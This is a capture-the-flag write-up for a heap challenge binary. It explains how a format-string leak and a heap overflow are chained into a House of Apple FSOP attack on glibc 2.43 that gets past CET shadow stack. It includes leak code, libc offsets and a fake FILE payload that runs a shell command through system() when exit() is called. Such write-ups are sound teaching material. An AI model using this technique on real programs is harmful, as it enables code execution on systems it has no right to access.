# 67 login system - exploit notes

## Summary

The challenge is a menu-based heap binary with four user slots. Each user object is `0x48` bytes:

```c
struct user {
    char name[0x40];
    FILE *fp;
};
```

`register` allocates a user object and opens `/dev/null` with `fopen`, storing the returned `FILE *` at `user+0x40`.

The exploit uses two bugs:

1. `show` calls `printf(user->name)`, giving a format string leak.
2. `update` reads `0x200` bytes into the `0x48`-byte user object, letting us overwrite the adjacent heap `FILE` object returned by `fopen`.

The final exploit is FSOP / House of Apple style on glibc 2.43. It overwrites the real heap `FILE` object and triggers it with `exit()`.

## Protections

The binary is PIE, NX, and effectively Full RELRO because it has `BIND_NOW`.

The libc from the container is:

```text
GNU libc 2.43
BuildID: d8ceb52a8c6e1fefece4ca75f7396d1d5bffc565
```

It also has CET:

```text
IBT, SHSTK
```

That matters because stack return hijacking is blocked by shadow stack. A normal ret2libc chain is not the right final path.

## Leaks

The first leak comes from `show`.

`show(slot)` effectively does:

```c
printf("username: ");
printf(user[slot]->name);
putc('\n', stdout);
write(1, user[slot], 0x48);
```

The format string gives PIE, stack, and libc leaks:

```python
fmt = b"|".join(f"{i}:%{i}$p".encode() for i in range(1, 51)) + b"|END\x00"
```

The important libc leak is argument 11:

```python
libc_base = leak11 - 0x27741  # __libc_start_main_ret
```

The raw `write(1, user, 0x48)` also leaks the `FILE *` stored at offset `0x40`:

```python
data = show(0)
raw = data.split(b"1. register", 1)[0][-0x48:]
fp = u64(raw[0x40:0x48])
```

This `fp` is the heap address of the real `FILE` object from `fopen("/dev/null", "a")`.

## Why Not ROP

A stack ROP chain can be built from the format string write primitive, and libc has:

```text
0x27fe2: pop rdi; pop rbp; ret
```

But glibc 2.43 in the container has shadow stack enabled. Overwriting only the normal stack return address causes a mismatch with the shadow stack on `ret`, killing the process.

The working exploit avoids stack return hijacking entirely.

## Failed First Attempt

My first attempt was a normal ret2libc chain. The format string bug can also be used as a write primitive, so the initial idea was:

```text
overwrite saved RIP
  -> ret
  -> pop rdi; pop rbp; ret
  -> "/bin/sh"
  -> filler for rbp
  -> system
```

There were two separate problems during that attempt.

First, I initially treated the gadget problem as if we had a classic `pop rdi; ret`. That was wrong for this libc. The useful gadget is:

```text
0x27fe2: pop rdi; pop rbp; ret
```

So the chain needs an extra dummy qword after the `/bin/sh` pointer. Without that filler, the address of `system` is consumed into `rbp` and execution continues at the wrong address.

Second, after fixing the chain layout, the approach still failed on the real target. The libc base and offsets were correct, but glibc 2.43 in the container has CET shadow stack enabled. The format string write only changes the normal stack. It does not update the shadow stack. When the function executes `ret`, the CPU compares the normal return address with the protected shadow-stack return address, detects the mismatch, and kills the process.

That is why the logs showed correct-looking addresses:

```text
libc = page-aligned base
system = libc + 0x54100
pop rdi; pop rbp; ret = libc + 0x27fe2
```

but the process still crashed. The offsets were not the root cause anymore; the exploitation technique was. FSOP avoids this because it does not rely on a corrupted stack return. It reaches `system` through libc's own indirect FILE machinery during `exit()`.

## FSOP Primitive

The overflow in `update` starts at the user object. The real `FILE` object is allocated immediately after it on the heap:

```text
user chunk:
  +0x00 name[0x40]
  +0x40 FILE *fp

next chunk:
  +0x48 heap chunk size for FILE
  +0x50 start of FILE object
```

So `update(0, payload)` can preserve `user->fp`, preserve the next chunk size, and overwrite the real `FILE` object in place:

```python
payload = flat({
    0x40: p64(fp),
    0x48: p64(0x1e1),
    0x50: fake_file,
}, filler=b"\x00")
```

## House of Apple Chain

The fake `FILE` uses `_IO_wfile_jumps`.

Relevant libc offsets:

```python
SYSTEM_OFF      = 0x54100
WFILE_JUMPS_OFF = 0x211228
LIBC_LEAK_OFF   = 0x27741
```

The important libc path is:

```text
exit()
  -> _IO_flush_all_lockp
  -> _IO_wfile_overflow(fp)
  -> _IO_wdoallocbuf(fp)
  -> call [fp->_wide_data->_wide_vtable + 0x68]
  -> system(fp)
```

At the indirect call, `rdi` still points to the `FILE` object. Therefore the fake `FILE` starts with a shell command. It begins with a leading space because `_IO_wdoallocbuf` tests flag bits in the first byte, and `' '` avoids the bad low bits while still being accepted by `/bin/sh -c`.

```python
fake_file = flat({
    0x00: b" cat /flag.txt\x00",
    0x20: p64(0),
    0x28: p64(1),
    0x68: p64(0),
    0x88: p64(fp + 0x180),          # _lock
    0xa0: p64(fp),                  # _wide_data
    0xc0: p64(0),                   # _mode <= 0
    0xd8: p64(libc_base + 0x211228),# _IO_wfile_jumps
    0xe0: p64(fp + 0x100),          # wide_data->_wide_vtable
    0x168: p64(libc_base + 0x54100),# wide_vtable[0x68] = system
}, filler=b"\x00")
```

Finally, trigger:

```python
update(io, 0, payload)
menu(io, 6)  # exit
```

`exit()` flushes the global FILE list, reaches the corrupted heap `FILE`, and calls `system(" cat /flag.txt")`.

## Usage

Local container:

```bash
./solve.py REMOTELOCAL
```

Remote:

```bash
./solve.py REMOTE
```

The recovered flag is saved separately in `flag.txt` when needed; the writeup intentionally does not include the flag value.